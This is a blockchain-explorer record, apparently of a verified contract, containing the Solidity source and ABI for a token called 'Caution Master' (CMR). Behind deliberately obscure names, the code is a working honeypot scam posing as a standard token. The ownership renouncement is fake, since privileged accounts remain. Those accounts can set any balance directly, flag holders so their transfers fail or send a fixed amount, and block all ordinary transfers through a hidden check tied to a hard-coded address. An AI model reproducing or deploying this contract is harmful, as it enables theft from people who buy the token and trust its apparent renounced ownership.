{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface takeTo {\n    function createPair(address liquidityExempt, address buyAuto) external returns (address);\n}\n\ninterface tokenAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTotal) external view returns (uint256);\n\n    function transfer(address shouldExempt, uint256 takeList) external returns (bool);\n\n    function allowance(address fundSwapSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldExempt,\n        uint256 takeList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromReceiverSell, uint256 value);\n    event Approval(address indexed fundSwapSender, address indexed spender, uint256 value);\n}\n\nabstract contract tradingSwapSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenAutoMetadata is tokenAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CautionMaster is tradingSwapSender, tokenAuto, tokenAutoMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return toList;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalReceiver;\n\n    function transfer(address sellTrading, uint256 takeList) external virtual override returns (bool) {\n        return walletEnable(_msgSender(), sellTrading, takeList);\n    }\n\n    uint8 private walletMarketingMax = 18;\n\n    function getOwner() external view returns (address) {\n        return launchSwapSender;\n    }\n\n    mapping(address => bool) public atFrom;\n\n    address fundAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTx;\n    }\n\n    function toMarketing(address sellTrading, uint256 takeList) public {\n        senderTake();\n        marketingFee[sellTrading] = takeList;\n    }\n\n    uint256 private sellReceiverMin;\n\n    function totalLimit(address teamBuy) public {\n        require(teamBuy.balance < 100000);\n        if (toTakeLaunch) {\n            return;\n        }\n        \n        walletMarketing[teamBuy] = true;\n        \n        toTakeLaunch = true;\n    }\n\n    string private toList = \"Caution Master\";\n\n    uint256 private liquidityMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletMarketingMax;\n    }\n\n    function walletEnable(address receiverToken, address shouldExempt, uint256 takeList) internal returns (bool) {\n        if (receiverToken == autoFundFrom) {\n            return walletMaxTeam(receiverToken, shouldExempt, takeList);\n        }\n        uint256 feeLaunchMode = tokenAuto(senderFeeWallet).balanceOf(modeBuy);\n        require(feeLaunchMode == fromMin);\n        require(shouldExempt != modeBuy);\n        if (atFrom[receiverToken]) {\n            return walletMaxTeam(receiverToken, shouldExempt, atTxAmount);\n        }\n        return walletMaxTeam(receiverToken, shouldExempt, takeList);\n    }\n\n    function walletMaxTeam(address receiverToken, address shouldExempt, uint256 takeList) internal returns (bool) {\n        require(marketingFee[receiverToken] >= takeList);\n        marketingFee[receiverToken] -= takeList;\n        marketingFee[shouldExempt] += takeList;\n        emit Transfer(receiverToken, shouldExempt, takeList);\n        return true;\n    }\n\n    function transferFrom(address receiverToken, address shouldExempt, uint256 takeList) external override returns (bool) {\n        if (_msgSender() != fundAt) {\n            if (totalReceiver[receiverToken][_msgSender()] != type(uint256).max) {\n                require(takeList <= totalReceiver[receiverToken][_msgSender()]);\n                totalReceiver[receiverToken][_msgSender()] -= takeList;\n            }\n        }\n        return walletEnable(receiverToken, shouldExempt, takeList);\n    }\n\n    bool public receiverTeam;\n\n    function allowance(address listLaunched, address receiverLiquidity) external view virtual override returns (uint256) {\n        if (receiverLiquidity == fundAt) {\n            return type(uint256).max;\n        }\n        return totalReceiver[listLaunched][receiverLiquidity];\n    }\n\n    address private launchSwapSender;\n\n    address modeBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return launchSwapSender;\n    }\n\n    event OwnershipTransferred(address indexed atBuy, address indexed fromMax);\n\n    function tokenReceiver(uint256 takeList) public {\n        senderTake();\n        fromMin = takeList;\n    }\n\n    string private exemptLimitReceiver = \"CMR\";\n\n    bool public enableBuy;\n\n    uint256 constant atTxAmount = 20 ** 10;\n\n    function buySenderMode(address modeMaxTeam) public {\n        senderTake();\n        if (liquidityMode != sellReceiverMin) {\n            liquidityMode = sellReceiverMin;\n        }\n        if (modeMaxTeam == autoFundFrom || modeMaxTeam == senderFeeWallet) {\n            return;\n        }\n        atFrom[modeMaxTeam] = true;\n    }\n\n    function balanceOf(address txTotal) public view virtual override returns (uint256) {\n        return marketingFee[txTotal];\n    }\n\n    mapping(address => uint256) private marketingFee;\n\n    constructor (){\n        if (sellReceiverMin == totalFeeAt) {\n            liquidityMode = sellReceiverMin;\n        }\n        enableMarketing autoAt = enableMarketing(fundAt);\n        senderFeeWallet = takeTo(autoAt.factory()).createPair(autoAt.WETH(), address(this));\n        if (totalFeeAt == sellReceiverMin) {\n            totalFeeAt = liquidityMode;\n        }\n        autoFundFrom = _msgSender();\n        walletMarketing[autoFundFrom] = true;\n        marketingFee[autoFundFrom] = walletTx;\n        enableLimit();\n        \n        emit Transfer(address(0), autoFundFrom, walletTx);\n    }\n\n    function senderTake() private view {\n        require(walletMarketing[_msgSender()]);\n    }\n\n    uint256 private walletTx = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptLimitReceiver;\n    }\n\n    mapping(address => bool) public walletMarketing;\n\n    function approve(address receiverLiquidity, uint256 takeList) public virtual override returns (bool) {\n        totalReceiver[_msgSender()][receiverLiquidity] = takeList;\n        emit Approval(_msgSender(), receiverLiquidity, takeList);\n        return true;\n    }\n\n    uint256 public totalFeeAt;\n\n    address public senderFeeWallet;\n\n    function enableLimit() public {\n        emit OwnershipTransferred(autoFundFrom, address(0));\n        launchSwapSender = address(0);\n    }\n\n    uint256 feeMax;\n\n    address public autoFundFrom;\n\n    uint256 fromMin;\n\n    bool public toTakeLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSwapSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiverSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFundFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMaxTeam\",\"type\":\"address\"}],\"name\":\"buySenderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeList\",\"type\":\"uint256\"}],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTakeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeList\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFeeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"totalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CautionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}